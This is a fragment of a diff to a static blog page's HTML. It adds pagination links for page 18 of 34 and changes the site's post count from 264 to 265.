+    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2176,7 +2425,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">264</span>
+                    <span class="site-state-item-count">265</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
